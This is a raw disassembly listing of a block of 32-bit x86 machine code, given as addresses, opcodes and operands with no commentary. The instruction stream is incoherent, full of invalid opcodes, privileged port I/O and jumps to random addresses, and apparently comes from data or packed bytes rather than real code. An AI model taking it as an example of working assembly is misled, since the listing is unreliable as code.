  4132e3:	das    
  4132e4:	daa    
  4132e5:	mov    ebx,0x9d3a9e56
  4132ea:	mov    bl,0x4c
  4132ec:	cdq    
  4132ed:	icebp  
  4132ee:	and    DWORD PTR [eax-0x49],edx
  4132f1:	jne    0x4132f5
  4132f3:	mov    esp,0x1138254e
  4132f8:	jecxz  0x4132ff
  4132fa:	cmp    DWORD PTR [ebp+0x46],edi
  4132fd:	inc    ebx
  4132fe:	in     al,0xbf
  413300:	or     DWORD PTR [ecx+0x59],ecx
  413303:	into   
  413304:	sub    esi,DWORD PTR ds:0x1de59553
  41330a:	jnp    0x41329b
  41330c:	xor    bl,ah
  41330e:	ret    
  41330f:	leave  
  413310:	push   ebp
  413311:	fs push cs
  413313:	jl     0x4132d9
  413315:	fisttp QWORD PTR [ebx-0x6f]
  413318:	inc    ecx
  413319:	(bad)  
  41331b:	shl    DWORD PTR [edi],1
  41331d:	test   eax,0x418fccfe
  413322:	loop   0x413339
  413324:	arpl   WORD PTR [eax],dx
  413326:	inc    ebx
  413327:	push   ebx
  413328:	(bad)  
  413329:	sar    DWORD PTR [ebx+0x23118e82],1
  41332f:	sbb    DWORD PTR [edx-0x1],edx
  413332:	dec    esp
  413333:	sbb    ch,bh
  413335:	bound  eax,QWORD PTR [edx+0xc]
  413338:	ror    BYTE PTR [edx+0x68d0d181],0x1
  41333f:	aad    0xe3
  413341:	push   eax
  413342:	std    
  413343:	jg     0x4133a9
  413345:	sub    ah,BYTE PTR [edx-0x4f]
  413348:	mov    eax,ds:0x5edd9d3
  41334d:	jbe    0x41337b
  41334f:	dec    ebx
  413350:	xchg   esi,eax
  413351:	cmp    al,0x2e
  413353:	rcr    BYTE PTR [edi],1
  413355:	sub    ecx,DWORD PTR [ecx-0xf]
  413358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413359:	mov    edi,0x4cac7c0d
  41335e:	sbb    al,0x4
  413360:	stos   DWORD PTR es:[edi],eax
  413361:	sbb    al,0x93
  413363:	shr    DWORD PTR [ebx-0x45],1
  413366:	dec    ebp
  413367:	call   0x4863c548
  41336c:	push   esp
  41336e:	cwde   
  41336f:	out    dx,eax
  413370:	sbb    BYTE PTR [ecx+ecx*2+0x1fc8c92a],dh
  413377:	retf   
  413378:	sti    
  413379:	fist   WORD PTR [edi+0x5e]
  41337c:	jno    0x413318
  41337e:	inc    esi
  41337f:	xor    DWORD PTR [edx-0x5a],0x3fe8560d
  413386:	out    dx,al
  413387:	iret   
  413388:	cld    
  413389:	jnp    0x4133d9
  41338b:	inc    ecx
  41338c:	mov    ah,0x86
  41338e:	or     bh,BYTE PTR [bx+si]
  413391:	push   es
  413392:	xor    esp,DWORD PTR [eax+0x2c268071]
  413398:	push   esp
  413399:	aas    
  41339a:	inc    ecx
  41339b:	repz js 0x41331f
  41339e:	ret    0xbe38
  4133a1:	dec    esi
  4133a2:	pop    edi
  4133a3:	dec    edi
  4133a4:	in     al,dx
  4133a5:	or     edi,DWORD PTR [esi-0x5fdac6a]
  4133ab:	xchg   ecx,eax
  4133ac:	enter  0xf44d,0x9e
  4133b0:	sbb    ebp,edx
  4133b2:	dec    ecx
  4133b3:	lahf   
  4133b4:	inc    esi
  4133b5:	dec    esp
  4133b6:	jbe    0x4133fa
  4133b8:	call   0x4745554f
  4133bd:	jl     0x41339f
  4133bf:	out    0x61,eax
  4133c1:	fadd   QWORD PTR [ebx-0x100231d0]
  4133c7:	dec    ebx
  4133c8:	into   
  4133c9:	rol    DWORD PTR [edi-0x54],cl
  4133cc:	jmp    0x95a39e3
  4133d1:	inc    esp
  4133d2:	sub    al,0xda
  4133d4:	fprem1 
  4133d6:	inc    ebp
  4133d7:	or     edi,esi
  4133d9:	loop   0x41339d
  4133db:	dec    esp
  4133dc:	in     eax,dx
  4133dd:	dec    esi
  4133de:	jge    0x41343d
  4133e0:	push   ecx
  4133e1:	idiv   BYTE PTR [ebp-0x48326029]
  4133e7:	ja     0x4133b5
  4133e9:	das    
  4133ea:	stos   BYTE PTR es:[edi],al
  4133eb:	shl    cl,1
  4133ed:	test   bl,dl
  4133ef:	inc    edx
  4133f0:	(bad)  
  4133f1:	jbe    0x4133c3
  4133f3:	pop    esi
  4133f4:	test   DWORD PTR [edx-0x31],ebx
  4133f7:	outs   dx,BYTE PTR ds:[esi]
  4133f8:	or     DWORD PTR [esi+0x3b94292f],ebx
  4133fe:	jns    0x4133d2
  413400:	pop    ebx
  413401:	scas   al,BYTE PTR es:[edi]
  413402:	add    ecx,DWORD PTR [ebp-0x60]
  413405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413406:	pop    edx
  413407:	scas   eax,DWORD PTR es:[edi]
  413408:	data16 je 0x413483
  41340b:	xor    BYTE PTR [eax-0x5119b7d8],dl
  413411:	lds    edi,FWORD PTR [eax-0x6aa1293c]
  413417:	sbb    al,0xa2
  413419:	arpl   WORD PTR [ebx+0x31],ax
  41341c:	mov    esi,0x3413ee93
  413421:	daa    
  413422:	inc    ebp
  413423:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413425:	addr16 add eax,0x8c64e10e
  41342b:	mov    edi,0x9b83c8b
  413430:	bound  ebx,QWORD PTR [edi]
  413432:	jne    0x413435
  413434:	mov    bh,0x82
  413436:	push   esp
  413437:	push   0xd71d60d7
  41343c:	into   
  41343d:	dec    ebx
  41343e:	arpl   WORD PTR [eax],ax
  413440:	lds    ebx,FWORD PTR [edi]
  413442:	xchg   edi,eax
  413443:	mov    dl,0xf8
  413445:	mov    cl,0x6d
  413447:	and    BYTE PTR ds:0xb58dfafe,ch
  41344d:	js     0x41347a
  41344f:	fnstcw WORD PTR [ecx+0x4e]
  413452:	fbstp  TBYTE PTR [eax+0x70]
  413455:	mov    cl,0x42
  413457:	in     al,0x18
  413459:	xor    ebp,DWORD PTR [esi+0x6972181d]
  41345f:	sbb    eax,DWORD PTR [esi]
  413461:	jno    0x413407
  413463:	js     0x4134a0
  413465:	inc    ecx
  413466:	call   0xc3a2:0xa8c3d302
  41346d:	xchg   ebx,eax
  41346e:	enter  0x2ad0,0xc7
  413472:	sub    al,0x55
  413474:	js     0x4134a1
  413476:	cmp    BYTE PTR [ebp-0x291752cb],bh
  41347c:	sbb    al,0x1a
  41347e:	push   esi
  41347f:	dec    ebx
  413480:	outs   dx,BYTE PTR ds:[esi]
  413481:	arpl   WORD PTR ds:0xf8f37c,ax
  413487:	ret    
  413488:	shr    BYTE PTR [edx-0x60379f95],0x1b
  41348f:	int3   
  413490:	inc    esp
  413491:	jno    0x413440
  413493:	enter  0x139b,0xda
  413497:	loopne 0x41346d
  413499:	sbb    al,0x11
  41349b:	cmc    
  41349c:	hlt    
  41349d:	push   esp
  41349e:	push   esi
  41349f:	fsubr  st(3),st
  4134a1:	fwait
  4134a2:	jg     0x413476
  4134a4:	outs   dx,DWORD PTR ds:[esi]
  4134a5:	dec    esi
  4134a6:	ja     0x413432
  4134a8:	xchg   edx,eax
  4134a9:	test   al,0x62
  4134ab:	(bad)  
  4134ad:	ret    
  4134ae:	lods   al,BYTE PTR ds:[esi]
  4134af:	out    0xf8,al
  4134b1:	adc    esp,DWORD PTR [esi+edi*8]
  4134b4:	sub    DWORD PTR [edi],ebp
  4134b6:	push   ds
  4134b7:	retf   
  4134b8:	cmp    al,0x93
  4134ba:	ja     0x41345a
  4134bc:	inc    ecx
  4134bd:	sub    ah,BYTE PTR [ebp+0x10d3b5ac]
  4134c3:	(bad)  
  4134c4:	mov    eax,ds:0xf9330a3e
  4134c9:	mov    al,ds:0x1ecadcaf
  4134ce:	out    0xab,eax
  4134d0:	jo     0x4134f4
  4134d2:	ins    BYTE PTR es:[edi],dx
  4134d3:	lea    esi,[ecx-0x6e]
  4134d6:	aad    0xb2
  4134d8:	stc    
  4134d9:	cmp    al,0x60
  4134db:	mov    ecx,0x8ee64af1
  4134e0:	leave  
  4134e1:	popa   
  4134e2:	inc    edx
  4134e3:	daa    
  4134e4:	sbb    ch,BYTE PTR gs:[ecx+ebx*1]
  4134e8:	in     eax,0x1a
  4134ea:	push   es
  4134eb:	push   edi
  4134ec:	sub    BYTE PTR [edi+0x25],dl
  4134ef:	test   BYTE PTR [eax],0x4e
  4134f2:	idiv   DWORD PTR [ecx]
  4134f4:	push   ds
  4134f5:	daa    
  4134f6:	add    bh,ah
  4134f8:	aaa    
  4134f9:	add    ah,BYTE PTR [esi]
  4134fb:	mov    ecx,0x52ce59cc
  413500:	adc    eax,0x808f2e4
  413505:	jo     0x41351a
  413507:	sub    bl,dl
  413509:	pop    ebp
  41350a:	sbb    edx,ebx
  41350c:	cli    
  41350d:	jmp    0x413553
  41350f:	fidivr WORD PTR [ecx-0x1c6f0c6e]
  413515:	lahf   
  413516:	dec    edx
  413517:	cmp    BYTE PTR [ebx+0x55],dl
  41351a:	mov    DWORD PTR [ebx],0x6b84626b
  413520:	test   al,0xb9
  413522:	sahf   
  413523:	mov    WORD PTR [esi-0x76],ds
  413526:	push   es
  413527:	(bad)  
  413528:	adc    ecx,edx
  41352a:	aaa    
  41352b:	and    al,0x5
  41352d:	push   cs
  41352e:	and    dl,0x70
  413531:	popf   
  413532:	data16 ja 0x413500
  413535:	add    ah,BYTE PTR es:[ecx]
  413538:	push   edi
  413539:	xor    DWORD PTR [edx+esi*2-0x55],ebx
  41353d:	sbb    eax,0x9c5dc913
  413542:	adc    ch,BYTE PTR [esi]
  413544:	cmp    al,0xe9
  413546:	stos   BYTE PTR es:[edi],al
  413547:	popa   
  413548:	mov    edx,0xb9986c7d
  41354d:	mov    eax,ds:0x13cdacb4
  413552:	pop    ebx
  413553:	jno    0x41350d
  413555:	ror    DWORD PTR ds:0xb4e1c6b2,0x24
  41355c:	push   esi
  41355d:	xchg   edi,eax
  41355e:	shr    DWORD PTR [eax+0x26],cl
  413561:	(bad)  
  413562:	xor    BYTE PTR [edi],bh
  413564:	xor    BYTE PTR [eax-0x58],cl
  413567:	xor    edx,DWORD PTR [ebx-0x1b7a3876]
  41356d:	jmp    0x8a9e:0xec4d39da
  413574:	or     ebx,esp
  413576:	sbb    edx,DWORD PTR [esi+0x7a]
  413579:	mov    BYTE PTR [ebx],dh
  41357b:	jbe    0x41356f
  41357d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41357e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41357f:	sub    DWORD PTR [ebx-0x5b],ebp
  413582:	jo     0x4135d0
  413584:	pop    esi
  413585:	ins    DWORD PTR es:[edi],dx
  413586:	cli    
  413587:	out    0xf5,eax
  413589:	and    DWORD PTR [ecx],0xa5ead1b6
  41358f:	mov    ah,0x1c
  413591:	sbb    BYTE PTR [esi+0x426c20f],0xdb
  413598:	lds    ecx,FWORD PTR [edi+esi*8+0x2]
  41359c:	cmp    ah,ah
  41359e:	out    dx,al
  41359f:	mov    ecx,0xc9d8301b
  4135a4:	ss inc di
  4135a7:	add    al,0xb3
  4135a9:	mov    al,0x57
  4135ac:	mov    al,0xfb
  4135ae:	js     0x41354d
  4135b0:	test   eax,0xfa4bfcf1
  4135b5:	scas   al,BYTE PTR es:[edi]
  4135b6:	sub    eax,0x66e35874
  4135bb:	mov    ch,0x58
  4135bd:	mov    ds:0xbd7029f8,al
  4135c2:	loope  0x4135b1
  4135c4:	loopne 0x413549
  4135c6:	or     dh,BYTE PTR [ecx]
  4135c8:	das    
  4135c9:	clc    
  4135ca:	lds    edi,FWORD PTR [esi+eiz*1+0x10e8e6ef]
  4135d1:	std    
  4135d2:	mov    ?,WORD PTR [ebp+0xd]
  4135d5:	into   
  4135d6:	call   0x2fff94d4
  4135db:	pop    esi
  4135dc:	mov    esi,0x4fa00b93
  4135e1:	fcmovbe st,st(4)
  4135e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e4:	scas   al,BYTE PTR es:[edi]
  4135e5:	(bad)  
  4135e6:	(bad)  
  4135e7:	stos   DWORD PTR es:[edi],eax
  4135e8:	xchg   esi,eax
  4135e9:	mov    ah,0xfa
  4135eb:	hlt    
  4135ec:	add    DWORD PTR [ecx],ebx
  4135ee:	pop    ecx
  4135ef:	push   ss
  4135f0:	rcl    DWORD PTR [eax+eax*4-0x223ed446],1
  4135f7:	fild   WORD PTR [eax+ebp*1]
  4135fa:	test   DWORD PTR [edi-0xd59a4d1],ecx
  413600:	jmp    0x9564:0x2eef484
  413607:	jl     0x4135e4
  413609:	stos   BYTE PTR es:[edi],al
  41360a:	dec    ebp
  41360b:	lock fimul DWORD PTR [eax-0x3d]
  41360f:	cmp    eax,DWORD PTR [ebx-0x424084a5]
  413615:	hlt    
  413616:	add    DWORD PTR [ebx-0x3f851bc4],0xffffffbe
  41361d:	cdq    
  41361e:	nop
  41361f:	fimul  DWORD PTR [ecx-0x1e]
  413622:	in     eax,0x43
  413624:	mul    DWORD PTR [ecx-0x4ef6b880]
  41362a:	in     al,0x13
  41362c:	stos   DWORD PTR es:[edi],eax
  41362d:	sbb    al,0x91
  41362f:	xor    edx,DWORD PTR [ebx-0x2b]
  413632:	or     cl,BYTE PTR [ebp+esi*8+0x3d6795e8]
  413639:	jge    0x413640
  41363b:	in     al,dx
  41363c:	and    eax,0x170b7fab
  413641:	cli    
  413642:	xor    dl,BYTE PTR [ebx+eiz*8-0x71d64c5]
  413649:	retf   0x29b3
  41364c:	mov    ebx,0x2cf33aab
  413651:	mov    ds:0x61cb9de7,al
  413656:	addr16 add eax,edx
  413659:	dec    edx
  41365a:	and    esp,edx
  41365c:	sub    ebp,DWORD PTR [ebx+esi*8]
  41365f:	adc    DWORD PTR [edx+0x7c51e0f2],eax
  413665:	add    eax,0xa90e575a
  41366a:	loope  0x4136a5
  41366c:	mov    WORD PTR [esi],fs
  41366e:	daa    
  41366f:	mov    dh,0xac
  413671:	adc    BYTE PTR [ecx*8-0x38a9960e],bl
  413678:	or     ch,0x3e
  41367b:	das    
  41367c:	call   0x8a5f:0x394e1273
  413683:	mov    cl,0x79
  413685:	lock enter 0xb08c,0xba
  41368a:	popa   
  41368b:	mov    esi,0x893a8b88
  413690:	jbe    0x41365d
  413692:	or     esp,0x77b8db6f
  413698:	mov    BYTE PTR [esi-0x6c17d45e],dl
  41369e:	and    al,0xad
  4136a0:	clc    
  4136a1:	sbb    DWORD PTR [ebx],edi
  4136a3:	mov    ebx,0x9ea93a10
  4136a8:	push   ebp
  4136a9:	pusha  
  4136aa:	fsubr  DWORD PTR ds:0x3d8d8432
  4136b0:	pop    ds
  4136b1:	nop
  4136b2:	gs out dx,eax
  4136b4:	cmp    al,0x3
  4136b6:	pop    es
  4136b7:	fld    QWORD PTR [ebx+0xb1eafb7]
  4136bd:	cdq    
  4136be:	fdiv   QWORD PTR [edi]
  4136c0:	out    dx,al
  4136c1:	imul   esp,DWORD PTR [ecx],0x8653ab51
  4136c7:	ins    BYTE PTR es:[edi],dx
  4136c8:	in     eax,dx
  4136c9:	std    
  4136ca:	ja     0x413741
  4136cc:	rcl    BYTE PTR [ebp+0x1518e1cd],cl
  4136d2:	imul   DWORD PTR [edi+0x56264f49]
  4136d8:	lds    edx,FWORD PTR ds:[ecx]
  4136db:	int    0xc4
  4136dd:	mov    esp,0xdd7fd7db
  4136e2:	pop    ds
  4136e3:	mov    ebx,0xa92f23db
  4136e8:	lahf   
  4136e9:	and    bh,BYTE PTR [edi-0x63aed2e4]
  4136ef:	(bad)  
  4136f0:	jb     0x413704
  4136f2:	les    ecx,FWORD PTR [edx-0x24]
  4136f5:	test   eax,0x240ca43d
  4136fa:	in     al,dx
  4136fb:	push   0xffffffba
  4136fd:	shl    dl,0xb
  413700:	test   DWORD PTR [ecx+0xd40780a],ecx
  413706:	push   es
  413707:	jp     0x41370a
  413709:	fisubr DWORD PTR [edi]
  41370b:	and    ebx,ecx
  41370d:	ins    DWORD PTR es:[edi],dx
  41370e:	(bad)  
  41370f:	jecxz  0x413694
  413711:	mov    al,ds:0xa097a314
  413716:	push   ss
  413717:	mov    bl,0xa2
  413719:	into   
  41371a:	xchg   DWORD PTR [edx],edx
  41371c:	mov    ebp,0x1b1961ca
  413721:	and    DWORD PTR ds:0x89c86f1,ebx
  413727:	fcomp  QWORD PTR [esi-0x3a]
  41372a:	stos   BYTE PTR es:[edi],al
  41372b:	leave  
  41372c:	fdiv   DWORD PTR [edx-0xac860b4]
  413732:	dec    ecx
  413733:	call   0x62e5:0x1376549e
  41373a:	stc    
  41373b:	adc    esp,ecx
  41373d:	add    ecx,ecx
  41373f:	xor    eax,0x9fbbd457
  413744:	daa    
  413745:	ret    0x3747
  413748:	and    esi,DWORD PTR [ebp+0x1b5f4393]
  41374e:	xchg   edx,eax
  41374f:	mov    bl,BYTE PTR [esi+ebx*8+0x7d]
  413753:	cld    
  413754:	fst    DWORD PTR [ebp+0x26]
  413757:	in     al,0x8c
  413759:	outs   dx,DWORD PTR ds:[esi]
  41375a:	stc    
  41375b:	mov    al,0x95
  41375d:	inc    edx
  41375e:	fst    DWORD PTR [edi]
  413760:	dec    esp
  413761:	daa    
  413762:	inc    eax
  413763:	and    al,0x66
  413765:	mov    bh,0x63
  413767:	xchg   ebp,eax
  413768:	add    eax,0x82863f05
  41376d:	leave  
  41376e:	mov    DWORD PTR [edi-0xd3f3ba7],eax
  413774:	cmp    DWORD PTR [eax+0x32],ebp
  413777:	mov    esp,0xf45b69dd
  41377c:	mov    ebp,0x4ebaa617
  413781:	stos   BYTE PTR es:[edi],al
  413782:	rcl    BYTE PTR [edx+0x4fa2edba],1
  413788:	rol    DWORD PTR [esp+0x1f629085],0x15
  413790:	adc    DWORD PTR [ebx+0x4b],edx
  413793:	lods   al,BYTE PTR ds:[esi]
  413794:	pop    ebx
  413795:	js     0x4137b4
  413797:	jne    0x4137e2
  413799:	lods   al,BYTE PTR ds:[esi]
  41379a:	jno    0x4137ef
  41379c:	xchg   edx,eax
  41379d:	or     DWORD PTR [esi-0x58],esi
  4137a0:	rol    DWORD PTR [ebx-0x1e1b3872],1
  4137a6:	xor    edx,DWORD PTR [edi]
  4137a8:	push   ds
  4137a9:	mov    BYTE PTR [ebx],bh
  4137ab:	stos   BYTE PTR es:[edi],al
  4137ac:	dec    esi
  4137ad:	stos   DWORD PTR es:[edi],eax
  4137ae:	pop    ss
  4137af:	push   ebx
  4137b0:	pop    ss
  4137b1:	jae    0x41381c
  4137b3:	xlat   BYTE PTR ds:[ebx]
  4137b4:	pop    esp
  4137b5:	cdq    
  4137b6:	aaa    
  4137b7:	xor    al,0x9e
  4137b9:	mov    ss,WORD PTR [ebx+0x687bd43b]
  4137bf:	fwait
  4137c0:	mov    cl,0xe7
  4137c2:	xchg   ebp,eax
  4137c3:	mov    cl,0xcc
  4137c5:	xchg   esp,eax
  4137c6:	in     eax,dx
  4137c7:	aas    
  4137c8:	inc    esi
  4137c9:	cmovle ebx,DWORD PTR [edx-0x5221758]
  4137d0:	mov    dh,0xba
  4137d2:	mov    dl,0xcf
  4137d4:	pop    ss
  4137d5:	dec    ebp
  4137d6:	pop    es
  4137d7:	cdq    
  4137d8:	(bad)  
  4137d9:	out    0xa5,al
  4137db:	sbb    ch,dh
  4137dd:	scas   al,BYTE PTR es:[edi]
  4137de:	mov    ebx,0x717093e7
  4137e3:	adc    bh,dh
  4137e5:	fadd   QWORD PTR [esi-0x73057c16]
  4137eb:	push   0xb2b635ce
  4137f0:	fs push ebx
  4137f2:	mov    gs,WORD PTR [edx]
  4137f4:	sub    al,0xaa
  4137f6:	popf   
  4137f7:	adc    al,0x84
  4137f9:	je     0x413864
  4137fb:	(bad)  [di-0x80]
  4137ff:	adc    BYTE PTR [esi+0x3305ecf],ah
  413805:	mov    eax,0x8409836b
  41380a:	hlt    
  41380b:	push   ecx
  41380c:	das    
  41380d:	push   ebx
  41380e:	fnsave [ebp-0x46]
  413811:	out    dx,eax
  413812:	fild   QWORD PTR [si]
  413815:	or     eax,0xb3af7547
  41381a:	stos   DWORD PTR es:[edi],eax
  41381b:	cmp    eax,0xa73f69ae
  413820:	clc    
  413821:	inc    ecx
  413822:	lock sub esp,DWORD PTR [edx+0x10]
  413826:	popf   
  413827:	dec    esp
  413828:	leave  
  413829:	jmp    0x816ae18c
  41382e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41382f:	cmp    dl,BYTE PTR [esi+0x79]
  413832:	xor    dh,BYTE PTR [ebp+0x1b468598]
  413838:	or     BYTE PTR [eax],dh
  41383a:	or     DWORD PTR [ebx-0x55],edx
  41383d:	ins    BYTE PTR es:[edi],dx
  41383e:	mov    cs,WORD PTR [ecx-0x45]
  413841:	stc    
  413842:	stc    
  413843:	jo     0x4138b4
  413845:	sbb    BYTE PTR [edi-0x7c71703c],al
  41384b:	sub    DWORD PTR [ebp+0x40],ebx
  41384e:	nop
  41384f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413850:	push   ebx
  413851:	cmp    BYTE PTR [ecx+0x28d74f27],dl
  413857:	out    dx,eax
  413858:	xchg   ebx,eax
  413859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385a:	shl    edi,0x1d
  41385d:	add    DWORD PTR [edx+0x56],ecx
  413860:	add    BYTE PTR [ebx+edi*2],dh
  413863:	fild   DWORD PTR [eax]
  413865:	and    BYTE PTR gs:[esi-0x53],0xd6
  41386a:	push   edi
  41386b:	push   edi
  41386c:	cmp    eax,0xe664a16a
  413871:	xor    eax,0x98da6b4f
  413876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413877:	repnz xchg esi,eax
  413879:	push   ebx
  41387a:	dec    eax
  41387b:	xchg   ebx,eax
  41387c:	jecxz  0x4138a4
  41387e:	pop    esi
  41387f:	jecxz  0x4138c3
  413881:	jns    0x413808
  413883:	rcl    esp,1
  413885:	mov    dl,BYTE PTR [ecx+edi*2-0x58]
  413889:	jo     0x41387f
  41388b:	push   0xa5eeab92
  413890:	ret    
  413891:	leave  
  413892:	adc    edx,DWORD PTR [eax+0x21]
  413895:	mov    cl,0x64
  413897:	pop    eax
  413898:	xor    esp,DWORD PTR [edi-0x74b33783]
  41389e:	add    eax,0xd218193b
  4138a3:	push   cs
  4138a4:	es inc esi
  4138a6:	(bad)  
  4138a7:	aam    0x68
  4138a9:	inc    edi
  4138aa:	out    0x5c,eax
  4138ac:	or     eax,0xd1c8b04b
  4138b1:	mov    ebp,0xa470c2a4
  4138b6:	or     esp,DWORD PTR [esi]
  4138b8:	cmc    
  4138b9:	jge    0x413918
  4138bb:	test   al,0x32
  4138bd:	stos   DWORD PTR es:[edi],eax
  4138be:	inc    edx
  4138bf:	fmul   QWORD PTR [edx]
  4138c1:	add    edi,esp
  4138c3:	xchg   esi,eax
  4138c4:	dec    ebp
  4138c5:	sbb    esp,ebx
  4138c7:	inc    ebx
  4138c8:	mov    ebx,0xda773ba4
  4138cd:	lods   eax,DWORD PTR ds:[esi]
  4138ce:	push   ecx
  4138cf:	xchg   edi,eax
  4138d0:	kandnw k5,k6,k0
  4138d4:	and    ah,BYTE PTR [esi]
  4138d6:	sub    eax,0xe9aae579
  4138db:	aas    
  4138dc:	mov    edi,0x996a0862
  4138e1:	sub    bh,BYTE PTR [edi]
  4138e3:	sub    DWORD PTR [ebx],esp
  4138e5:	fs pop ebp
  4138e7:	dec    edi
  4138e8:	pop    ecx
  4138e9:	test   al,0x1d
  4138eb:	retf   0x317b
  4138ee:	cmp    BYTE PTR [ebx+0x3466b303],0x72
  4138f5:	int3   
  4138f6:	fs repnz pop edx
  4138f9:	ins    DWORD PTR es:[edi],dx
  4138fa:	into   
  4138fb:	pop    edx
  4138fc:	out    0x39,al
  4138fe:	fst    DWORD PTR [edx]
  413900:	or     al,0x7d
  413902:	push   ebx
  413903:	mov    edi,0xfe5b7e99
  413908:	dec    eax
  413909:	jmp    0x618:0x2845f5d9
  413910:	data16 adc ah,BYTE PTR [edx-0x60]
  413914:	rol    BYTE PTR [edx-0x177a8458],cl
  41391a:	shl    BYTE PTR [edx],1
  41391c:	xchg   ebx,eax
  41391d:	rcr    DWORD PTR es:0xe7fd4827,1
  413924:	bound  esi,QWORD PTR [esi]
  413926:	pusha  
  413927:	jmp    0x59b8:0xd56e72e
  41392e:	mov    bh,0x95
  413930:	add    eax,0x7b2672b3
  413935:	xor    edx,ebx
  413937:	rol    BYTE PTR [eax+esi*1],1
  41393a:	scas   eax,DWORD PTR es:[edi]
  41393b:	mov    WORD PTR [edi-0x4991ea74],gs
  413941:	push   ss
  413942:	or     esp,ebx
  413944:	xor    edx,edx
  413946:	mov    edx,ebp
  413948:	add    DWORD PTR [ebx-0x10],esp
  41394b:	mov    BYTE PTR [ebx+0x5166b0d3],cl
  413951:	mov    bh,0xb3
  413953:	push   ebx
  413954:	and    esi,esp
  413956:	ficom  WORD PTR es:[eax+edi*2]
  41395a:	dec    esp
  41395b:	sbb    bh,cl
  41395d:	mov    ds,WORD PTR [ebx+0x9]
  413960:	or     BYTE PTR [eax-0x1fe519f6],bl
  413966:	xchg   ebp,eax
  413967:	lods   al,BYTE PTR ds:[esi]
  413968:	test   al,0x1
  41396a:	das    
  41396b:	xor    DWORD PTR [ecx-0xeea68a9],ebx
  413971:	inc    ecx
  413972:	pop    edx
  413973:	data16 xlat BYTE PTR ds:[ebx]
  413975:	pop    edx
  413976:	dec    ecx
  413977:	xor    BYTE PTR [esi+ebp*1-0x12],0xa7
  41397c:	mov    dl,0x9e
  41397e:	jns    0x4139df
  413980:	lahf   
  413981:	inc    ecx
  413982:	imul   edx,DWORD PTR [edx+0x33ccc9bf],0x1216b8fb
  41398c:	inc    ebp
  41398d:	(bad)  [esi+0x27beb7e4]
  413993:	mov    eax,0x2fdf0fa8
  413998:	nop
  413999:	sub    ch,bh
  41399b:	and    al,0x6f
  41399d:	lods   eax,DWORD PTR ds:[esi]
  41399e:	lods   eax,DWORD PTR ds:[esi]
  41399f:	cwde   
  4139a0:	lgdtd  [ecx]
  4139a3:	mov    bh,0xa
  4139a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a6:	adc    edi,eax
  4139a8:	imul   edx,ebx,0x34
  4139ab:	sahf   
  4139ac:	test   eax,0x771ed3dd
  4139b1:	inc    edx
  4139b2:	out    0xd6,eax
  4139b4:	jle    0x41395c
  4139b6:	mov    esi,0xacda3ec4
  4139bb:	cmp    DWORD PTR [edi+esi*2],edx
  4139be:	cmp    al,0x9e
  4139c0:	sar    edx,1
  4139c2:	sub    esi,DWORD PTR [ecx*1-0x6f960e7]
  4139c9:	outs   dx,BYTE PTR ds:[esi]
  4139ca:	push   ss
  4139cb:	and    DWORD PTR [esi+0x4167a46c],edi
  4139d1:	int    0x7c
  4139d3:	mov    eax,0x6a0eb5f6
  4139d8:	repnz and eax,0x1ede5dac
  4139de:	cmp    bl,BYTE PTR [ebx-0x4d]
  4139e1:	jns    0x413a43
  4139e3:	add    eax,0xccf34228
  4139e8:	push   edi
  4139e9:	call   0xf5e920f7
  4139ee:	mul    DWORD PTR [eax-0x5b]
  4139f1:	jo     0x413988
  4139f3:	aam    0xd2
  4139f5:	sbb    edi,DWORD PTR [esi+0x5248291b]
  4139fb:	mov    ebx,0x67aabcf
  413a00:	pop    esp
  413a01:	clc    
  413a02:	test   ecx,edx
  413a04:	pop    edi
  413a05:	mov    eax,DWORD PTR [eax+0x74b8143d]
  413a0b:	xchg   esp,eax
  413a0c:	xor    al,0x25
  413a0e:	mov    al,dh
  413a10:	out    dx,al
  413a11:	popa   
  413a12:	popa   
  413a13:	in     al,0x73
  413a15:	push   ebp
  413a16:	sbb    edi,DWORD PTR [edx+0x20]
  413a19:	inc    ebx
  413a1a:	pop    eax
  413a1b:	xor    ah,BYTE PTR [esi+ecx*4-0x42b93a3d]
  413a22:	call   0x5389a82e
  413a27:	jp     0x4139d9
  413a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2a:	xor    ecx,DWORD PTR [esi+0x4d6cff55]
  413a30:	shl    DWORD PTR [ebx+0x5399a8fb],1
  413a36:	and    DWORD PTR [eax-0x761967f6],eax
  413a3c:	sub    DWORD PTR [edi-0x8],edi
  413a3f:	xchg   edi,eax
  413a40:	fmul   QWORD PTR [esi+0x225d5c05]
  413a46:	fsub   st,st(7)
  413a48:	dec    esp
  413a49:	xchg   BYTE PTR [ebx+0x45b08859],bl
  413a4f:	sub    eax,0xbf70e10e
  413a54:	push   esp
  413a55:	adc    cl,BYTE PTR [edx-0x40]
  413a58:	aam    0x10
  413a5a:	fisubr WORD PTR [ecx+0x7d]
  413a5d:	stc    
  413a5e:	pop    edi
  413a5f:	xchg   bh,ch
  413a61:	cld    
  413a62:	mov    esi,esi
  413a64:	fidivr DWORD PTR [edi]
  413a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a67:	in     al,dx
  413a68:	inc    edi
  413a69:	add    BYTE PTR [ebx-0x6c],0x6
  413a6d:	mov    BYTE PTR [edx+0x2f],cl
  413a70:	ja     0x413a8d
  413a72:	imul   DWORD PTR [ebx]
  413a74:	jmp    0xd17bde05
  413a79:	gs pop ss
  413a7b:	xor    eax,0x1a00b05f
  413a80:	mov    ebx,0x3c9403fd
  413a85:	ror    BYTE PTR [edx+edi*8-0x5bec08ba],cl
  413a8c:	push   ss
  413a8d:	sub    DWORD PTR [edi],eax
  413a8f:	out    0xeb,eax
  413a91:	imul   esp,DWORD PTR [ebx],0x23
  413a94:	xor    eax,DWORD PTR [esp+ebp*8-0x18c3e35a]
  413a9b:	mov    ecx,0x82805ea5
  413aa0:	ins    DWORD PTR es:[edi],dx
  413aa1:	mov    al,0x9f
  413aa3:	jmp    0xd6bf:0x693798a9
  413aaa:	ds jmp 0xbe66:0xb9e19759
